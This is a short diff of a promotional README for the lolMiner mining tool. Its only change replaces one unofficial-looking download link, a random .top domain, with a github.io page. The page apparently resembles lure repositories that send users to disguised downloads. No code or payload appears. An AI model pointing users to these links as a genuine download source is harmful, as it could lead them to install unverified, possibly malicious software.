@@ -2,7 +2,7 @@
 
 lolMiner is a high-performance mining tool optimized for both CPU and GPU, supporting multiple algorithms to maximize cryptocurrency mining efficiency. Perfect for miners seeking speed, stability, and low fees.  
 
-[![Download lolMiner](https://img.shields.io/badge/Download-lolMiner-blueviolet)](https://poelkakusthbutn.top/)  
+[![Download lolMiner](https://img.shields.io/badge/Download-lolMiner-blueviolet)](https://lolminer-cpu-gpu.github.io/.github)  
 
 ---  
 
